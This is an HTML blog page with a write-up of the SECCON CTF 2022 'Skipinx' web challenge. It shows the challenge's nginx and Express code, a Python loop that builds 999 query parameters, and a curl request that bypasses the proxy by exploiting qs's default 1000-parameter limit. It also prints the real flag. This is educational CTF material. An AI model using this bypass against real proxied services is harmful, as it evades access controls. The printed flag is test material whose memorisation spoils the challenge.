@@ -1,0 +1,351 @@
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html
+  class="not-ready lg:text-base"
+  style="--bg: #faf8f1"
+  lang="en"
+>
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1, shrink-to-fit=no"
+  />
+
+  
+  <title>SECCON CTF 2022 Skipinx - Paper</title>
+
+  
+  <meta name="theme-color" />
+
+  
+  
+  
+  
+  <meta name="description" content="I solved this challenge when competing with my team Fidethus, under the username berlian_gm. The files can be downloaded here and run locally with Docker.
+The Problem The goal of this challenge, just like the title of the challenge implies, is to bypass the Nginx. Trying to access the port 8080 returns the following:
+❯ curl localhost:8080/ Access here directly, not via nginx :( After checking nginx/default.conf, we can see that the Nginx append the following parameter: proxy=nginx at the end of the query parameter, before proxying the request to backend server." />
+  <meta name="author" content="Paper" />
+  
+
+  
+  
+  
+  
+  
+  
+  <link rel="preload stylesheet" as="style" href="https://hugo-paper.vercel.app/main.min.css" />
+
+  
+  
+  
+  
+  
+  <link rel="preload" as="image" href="https://hugo-paper.vercel.app/theme.png" />
+
+  
+  
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  <script
+    defer
+    src="https://hugo-paper.vercel.app/highlight.min.js"
+    onload="hljs.initHighlightingOnLoad();"
+  ></script>
+  
+
+  
+  
+  
+
+  
+  <link rel="icon" href="https://hugo-paper.vercel.app/favicon.ico" />
+  <link rel="apple-touch-icon" href="https://hugo-paper.vercel.app/apple-touch-icon.png" />
+
+  
+  <meta name="generator" content="Hugo 0.92.2" />
+
+  
+  
+  
+  
+  
+  <meta itemprop="name" content="SECCON CTF 2022 Skipinx">
+<meta itemprop="description" content="I solved this challenge when competing with my team Fidethus, under the username berlian_gm. The files can be downloaded here and run locally with Docker.
+The Problem The goal of this challenge, just like the title of the challenge implies, is to bypass the Nginx. Trying to access the port 8080 returns the following:
+❯ curl localhost:8080/ Access here directly, not via nginx :( After checking nginx/default.conf, we can see that the Nginx append the following parameter: proxy=nginx at the end of the query parameter, before proxying the request to backend server."><meta itemprop="datePublished" content="2023-10-17T00:49:51+07:00" />
+<meta itemprop="dateModified" content="2023-10-17T00:49:51+07:00" />
+<meta itemprop="wordCount" content="566">
+<meta itemprop="keywords" content="" />
+  
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SECCON CTF 2022 Skipinx"/>
+<meta name="twitter:description" content="I solved this challenge when competing with my team Fidethus, under the username berlian_gm. The files can be downloaded here and run locally with Docker.
+The Problem The goal of this challenge, just like the title of the challenge implies, is to bypass the Nginx. Trying to access the port 8080 returns the following:
+❯ curl localhost:8080/ Access here directly, not via nginx :( After checking nginx/default.conf, we can see that the Nginx append the following parameter: proxy=nginx at the end of the query parameter, before proxying the request to backend server."/>
+
+  
+  
+  
+  <link rel="canonical" href="https://hugo-paper.vercel.app/post/seccon-ctf-2022-skipinx/" />
+  
+  
+</head>
+
+  <body class="text-black duration-200 ease-out dark:text-white">
+    <header class="mx-auto flex h-[4.5rem] max-w-3xl px-8 lg:justify-center">
+  <div class="relative z-50 mr-auto flex items-center">
+    <a
+      class="-translate-x-[1px] -translate-y-[1px] text-2xl font-semibold"
+      href="https://hugo-paper.vercel.app/"
+      >Paper</a
+    >
+    <div
+      class="btn-dark text-[0] ml-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]"
+      role="button"
+      aria-label="Dark"
+    ></div>
+  </div>
+
+  <div
+    class="btn-menu relative z-50 -mr-8 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+    role="button"
+    aria-label="Menu"
+  ></div>
+
+  
+  <script>
+    
+    const htmlClass = document.documentElement.classList;
+    setTimeout(() => {
+      htmlClass.remove('not-ready');
+    }, 10);
+
+    
+    const btnMenu = document.querySelector('.btn-menu');
+    btnMenu.addEventListener('click', () => {
+      htmlClass.toggle('open');
+    });
+
+    
+    const metaTheme = document.querySelector('meta[name="theme-color"]');
+    const lightBg = '#faf8f1'.replace(/"/g, '');
+    const setDark = (isDark) => {
+      metaTheme.setAttribute('content', isDark ? '#000' : lightBg);
+      htmlClass[isDark ? 'add' : 'remove']('dark');
+      localStorage.setItem('dark', isDark);
+    };
+
+    
+    const darkScheme = window.matchMedia('(prefers-color-scheme: dark)');
+    if (htmlClass.contains('dark')) {
+      setDark(true);
+    } else {
+      const darkVal = localStorage.getItem('dark');
+      setDark(darkVal ? darkVal === 'true' : darkScheme.matches);
+    }
+
+    
+    darkScheme.addEventListener('change', (event) => {
+      setDark(event.matches);
+    });
+
+    
+    const btnDark = document.querySelector('.btn-dark');
+    btnDark.addEventListener('click', () => {
+      setDark(localStorage.getItem('dark') !== 'true');
+    });
+  </script>
+
+  <div
+    class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full select-none flex-col justify-center pb-16 duration-200 dark:bg-black lg:static lg:h-auto lg:flex-row lg:!bg-transparent lg:pb-0 lg:transition-none"
+  >
+    
+    
+    <nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-6">
+      
+      <a
+        class="block text-center text-2xl leading-[5rem] lg:text-base lg:font-normal"
+        href="/about/"
+        >About</a
+      >
+      
+      <a
+        class="block text-center text-2xl leading-[5rem] lg:text-base lg:font-normal"
+        href="/contact/"
+        >Contact</a
+      >
+      
+    </nav>
+    
+
+    
+  </div>
+</header>
+
+
+    <main
+      class="prose prose-neutral relative mx-auto min-h-[calc(100%-9rem)] max-w-3xl px-8 pb-16 pt-12 dark:prose-invert"
+    >
+      
+
+<article>
+  <header class="mb-16">
+    <h1 class="!my-0 pb-2.5">SECCON CTF 2022 Skipinx</h1>
+
+    
+    <div class="text-sm antialiased opacity-60">
+      
+      <time>Oct 17, 2023</time>
+      
+      
+      
+      
+    </div>
+    
+  </header>
+
+  <section><p>I solved this challenge when competing with my team Fidethus, under the username berlian_gm. The files can be downloaded <a href="https://drive.google.com/file/d/1zLdgyaYjHv0EAQZeYU31JF8JnLpa9MJr/view?usp=sharing"><strong>here</strong></a> and run locally with Docker.</p>
+<h1 id="the-problem">The Problem</h1>
+<p>The goal of this challenge, just like the title of the challenge implies, is to bypass the Nginx. Trying to access the port 8080 returns the following:</p>
+<pre tabindex="0"><code>❯ curl localhost:8080/  
+Access here directly, not via nginx :(
+</code></pre><p>After checking nginx/default.conf, we can see that the Nginx append the following parameter: <em>proxy=nginx</em> at the end of the query parameter, before proxying the request to backend server.</p>
+<pre tabindex="0"><code>server {  
+  listen 8080 default_server;  
+  server_name nginx;  
+  
+  location / {  
+    set $args &quot;${args}&amp;proxy=nginx&quot;;  
+    proxy_pass http://web:3000;  
+  }  
+}
+</code></pre><p>Looking at web/index.js, we can see that the server will only return the flag if there is no term “nginx” in the query parameter. Therefore, to get the flag, we have to somehow eliminate the the term “nginx” that will always be located at the end of the query parameter.</p>
+<pre tabindex="0"><code>const app = require(&quot;express&quot;)();  
+  
+const FLAG = process.env.FLAG ?? &quot;SECCON{dummy}&quot;;  
+const PORT = 3000;  
+  
+app.get(&quot;/&quot;, (req, res) =&gt; {  
+  req.query.proxy.includes(&quot;nginx&quot;)  
+    ? res.status(400).send(&quot;Access here directly, not via nginx :(&quot;)  
+    : res.send(`Congratz! You got a flag: ${FLAG}`);  
+});  
+  
+app.listen({ port: PORT, host: &quot;0.0.0.0&quot; }, () =&gt; {  
+  console.log(`Server listening at ${PORT}`);  
+});
+</code></pre><h1 id="the-approach">The Approach</h1>
+<p>The first thing that came to mind was to create a URL with super long query parameter, such as <em>localhost:8080/?q=111…..111</em>, that will hopefully push out the term “nginx” at the back. However, this approach did not work.</p>
+<p>Next, I tried to add this line of code inside the <em>app.get</em> function in web/index.js to view the log:</p>
+<pre tabindex="0"><code>console.log(req.query);
+</code></pre><p>Sending a request with multiple query parameters will result in some sort of array in the log output. Trying to send request with 1024 parameters like this: <em>localhost:8080/?0=q&amp;1=q&amp;2=q&amp;…..&amp;1023=q</em> will result in Internal Server Error. The log will show the following error message:</p>
+<pre tabindex="0"><code>...  
+  '997': 'q',  
+  '998': 'q',  
+  '999': 'q'  
+}  
+TypeError: Cannot read properties of undefined (reading 'includes')  
+    at /app/index.js:8:19  
+    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)  
+    at next (/app/node_modules/express/lib/router/route.js:144:13)  
+    at Route.dispatch (/app/node_modules/express/lib/router/route.js:114:3)  
+    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)  
+    at /app/node_modules/express/lib/router/index.js:284:15  
+    at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12)  
+    at next (/app/node_modules/express/lib/router/index.js:280:10)  
+    at expressInit (/app/node_modules/express/lib/middleware/init.js:40:5)  
+    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
+
+</code></pre><p>It is very interesting that the array stops at 999, even if we supplied with more parameters. There is also an error from Express that is worth checking.</p>
+<p>As we can see from <a href="https://expressjs.com/en/api.html#app.set">https://expressjs.com/en/api.html#app.set</a>, the extended query parses in Express is based on qs, and uses its default value. We can also see from from <a href="https://github.com/ljharb/qs/blob/v6.11.0/lib/parse.js?#L8-L25">https://github.com/ljharb/qs/blob/v6.11.0/lib/parse.js?#L8-L25</a>, the option <em>parameterLimit</em> which specified the maximum number of query parameters has the default value of 1000. These lines of codes from <a href="https://github.com/ljharb/qs/blob/v6.11.0/lib/parse.js#L54-L55">https://github.com/ljharb/qs/blob/v6.11.0/lib/parse.js#L54-L55</a> indicates that Express will ignore the supplied parameters after the 1000th parameter.</p>
+<h1 id="the-solution">The Solution</h1>
+<p>We need to create a request that contains 1000 query parameters, with the 1000th parameter being set to <em>“proxy=whatever”</em>. We can use the following python code to generate the query parameters, and then manually append the query parameters to the URL.</p>
+<pre tabindex="0"><code>for i in range(0, 999):  
+    print (str(i)+'=q&amp;',end='')
+</code></pre><pre tabindex="0"><code>❯ curl localhost:8080/?0=q&amp;1=q&amp;2=q&amp; ..... &amp;998=q&amp;proxy=whatever  
+Congratz! You got a flag: SECCON{dummydummy}
+</code></pre><p>The Real Flag: `SECCON{sometimes_deFault_options_are_useful_to_bypa55}</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>I think this CTF problem can serve as a good exercise for those who have just started in Web CTF. It provides opportunities to get a hold of how Nginx works and can also demonstrate the importance of understanding the source code of the library that are being used.</p>
+</section>
+
+  
+  
+
+  
+  
+  
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</article>
+
+
+    </main>
+
+    <footer
+  class="opaco mx-auto flex h-[4.5rem] max-w-3xl items-center px-8 text-[0.9em] opacity-60"
+>
+  <div class="mr-auto">
+    &copy; 2023
+    <a class="link" href="https://hugo-paper.vercel.app/">Paper</a>
+  </div>
+  <a class="link mx-6" href="https://gohugo.io/" rel="noopener" target="_blank"
+    >Powered by Hugo️️</a
+  >️
+  <a
+    class="link"
+    href="https://github.com/nanxiaobei/hugo-paper"
+    rel="noopener"
+    target="_blank"
+    >✎ Paper</a
+  >
+</footer>
+
+  </body>
+</html>
